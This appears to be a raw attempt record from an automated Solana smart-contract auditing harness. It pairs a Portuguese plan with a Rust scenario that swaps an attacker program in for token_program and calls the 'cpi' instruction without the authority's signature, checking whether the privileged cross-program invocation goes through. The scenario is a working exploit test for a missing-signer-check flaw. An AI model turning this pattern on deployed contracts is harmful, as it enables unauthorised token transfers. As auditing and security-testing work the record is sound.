attempts.raw:
{
  "plan": "O programa-alvo apenas constroi uma CPI para `token_program` com a conta `authority` marcada como signer no AccountMeta, mas sem validar `is_signer`. Para testar a hipotese, usamos o programa atacante como `token_program` (que aceita qualquer instrucao e registra o estado), e uma conta `authority` que nao assina. O baseline chama `cpi` com a authority assinando; o ataque chama a mesma instrucao sem a assinatura da authority. O efeito mede se o programa atacante foi invocado e alterou seu estado, demonstrando que a CPI privilegiada ocorreu sem a assinatura da autoridade.",
  "scenario": "let attacker = env.attacker_program.expect("attacker program required");

let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let authority = Pubkey::new_unique();

let source_acc = account(&env.program_id, &[], None);
let destination_acc = account(&env.program_id, &[], None);
let authority_acc = account(&env.program_id, &[], None);
let token_program_acc = program_account(&attacker);

let metas = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(attacker, false),
];
let ix = env.anchor_ix("cpi", &(&100u64), metas);

let contas = vec![
    (source, source_acc.clone()),
    (destination, destination_acc.clone()),
    (authority, authority_acc.clone()),
    (attacker, token_program_acc.clone()),
];

let r_base = env.baseline("cpi legitima com authority assinando", &ix, &contas);

let metas_ataque = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, false),
    AccountMeta::new_readonly(attacker, false),
];
let ix_ataque = env.anchor_ix("cpi", &(&100u64), metas_ataque);

let r = env.attack("cpi sem assinatura da authority", &ix_ataque, &contas);

if r.program_result == ProgramResult::Success {
    let attacker_after = after(&r, &attacker);
    env.effect(
        "CPI executada sem assinatura da authority: programa atacante foi invocado",
        attacker_after.data().len() > 0 || attacker_after.lamports() != token_program_acc.lamports(),
    );
}"
}

